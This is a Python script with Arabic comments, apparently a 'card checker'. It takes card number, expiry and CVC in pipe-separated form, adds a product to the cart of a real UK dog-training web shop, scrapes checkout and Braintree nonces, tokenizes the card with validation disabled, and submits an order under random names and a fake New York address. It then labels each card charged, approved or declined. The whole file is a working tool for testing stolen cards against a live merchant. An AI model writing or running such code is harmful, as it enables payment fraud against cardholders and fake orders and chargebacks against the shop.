import requests
import random
import string
import re
import base64
import time
from user_agent import generate_user_agent

def BraC(ccx):
    try:
        import requests
        import re
        import random
        import string
        import base64
        import time
        from user_agent import generate_user_agent
        
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        
        if "20" in yy:
            yy = yy.split("20")[1]
        
        user = generate_user_agent()
        r = requests.Session()
        
        # بيانات عشوائية
        email = f"user{random.randint(1000,9999)}{random.randint(1000,9999)}@gmail.com"
        first_name = ''.join(random.choices(string.ascii_letters, k=8))
        last_name = ''.join(random.choices(string.ascii_letters, k=10))
        
        # ===== 1. إضافة منتج للعربة =====
        headers_add = {
            'authority': 'southenddogtraining.co.uk',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary',
            'origin': 'https://southenddogtraining.co.uk',
            'referer': 'https://southenddogtraining.co.uk/shop/training-equipment/dog-clicker/',
            'user-agent': user,
        }
        
        files = {
            'quantity': (None, '1'),
            'add-to-cart': (None, '123368'),
            'product_id': (None, '123368'),
        }
        
        r.post('https://southenddogtraining.co.uk/shop/training-equipment/dog-clicker/', headers=headers_add, files=files)
        
        # ===== 2. فتح صفحة الدفع =====
        headers_checkout = {
            'authority': 'southenddogtraining.co.uk',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'referer': 'https://southenddogtraining.co.uk/shop/training-equipment/dog-clicker/',
            'user-agent': user,
        }
        
        response = r.get('https://southenddogtraining.co.uk/checkout/', headers=headers_checkout)
        
        # استخراج checkout nonce
        checkout_match = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text)
        if not checkout_match:
            return "Error: Checkout nonce not found"
        checkout_nonce = checkout_match.group(1)
        
        # استخراج client token nonce
        client_nonce_match = re.search(r'client_token_nonce":"([^"]+)"', response.text)
        if not client_nonce_match:
            client_nonce_match = re.search(r'data-client-token-nonce="([^"]+)"', response.text)
        
        if not client_nonce_match:
            return "Error: Client token nonce not found"
        client_nonce = client_nonce_match.group(1)
        
        # ===== 3. الحصول على client token عبر AJAX =====
        headers_ajax = {
            'authority': 'southenddogtraining.co.uk',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://southenddogtraining.co.uk',
            'referer': 'https://southenddogtraining.co.uk/checkout/',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data_ajax = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': client_nonce,
        }
        
        ajax_response = r.post('https://southenddogtraining.co.uk/cms/wp-admin/admin-ajax.php', headers=headers_ajax, data=data_ajax)
        
        try:
            enc_token = ajax_response.json()['data']
            dec_token = base64.b64decode(enc_token).decode('utf-8')
            auth_match = re.findall(r'"authorizationFingerprint":"([^"]+)"', dec_token)
            if not auth_match:
                return "Error: Authorization fingerprint not found"
            auth_fingerprint = auth_match[0]
        except Exception as e:
            return f"Error getting client token: {str(e)}"
        
        # ===== 4. إنشاء توكن البطاقة عبر Braintree GraphQL =====
        headers_token = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'authorization': f'Bearer {auth_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'user-agent': user,
        }
        
        json_token = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': f"{random.randint(10000,99999)}-{random.randint(10000,99999)}-{random.randint(10000,99999)}",
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                    },
                    'options': {'validate': False},
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        
        token_response = requests.post('https://payments.braintree-api.com/graphql', headers=headers_token, json=json_token)
        
        try:
            tok = token_response.json()['data']['tokenizeCreditCard']['token']
        except:
            return "Error creating payment token"
        
        # ===== 5. إتمام عملية الشراء =====
        headers_final = {
            'authority': 'southenddogtraining.co.uk',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://southenddogtraining.co.uk',
            'referer': 'https://southenddogtraining.co.uk/checkout/',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        params = {'wc-ajax': 'checkout'}
        
        data_final = {
            'payment_method': 'braintree_credit_card',
            'wc_braintree_credit_card_payment_nonce': tok,
            'wc_braintree_device_data': f'{{"correlation_id":"{random.randint(10000,99999)}-{random.randint(10000,99999)}-{random.randint(10000,99999)}"}}',
            'billing_first_name': first_name,
            'billing_last_name': last_name,
            'billing_email': email,
            'billing_phone': '15416450372',
            'billing_address_1': '6200 Phyllis Dr',
            'billing_postcode': '10090',
            'billing_city': 'New York',
            'billing_state': 'NY',
            'billing_country': 'US',
            'terms': 'on',
            'terms-field': '1',
            'woocommerce-process-checkout-nonce': checkout_nonce,
            '_wp_http_referer': '/?wc-ajax=update_order_review',
        }
        
        final_response = r.post('https://southenddogtraining.co.uk/', params=params, headers=headers_final, data=data_final)
        text = final_response.text
        
        # ===== 6. تحليل النتيجة =====
        if 'order-received' in text or 'thankyou' in text.lower():
            return "CHARGE ✅"
        elif 'declined' in text.lower():
            return "Declined ❌"
        elif 'insufficient_funds' in text.lower():
            return "Approved ✅"
        else:
            return "Declined ❌"
            
    except Exception as e:
        return f"Error: {str(e)}"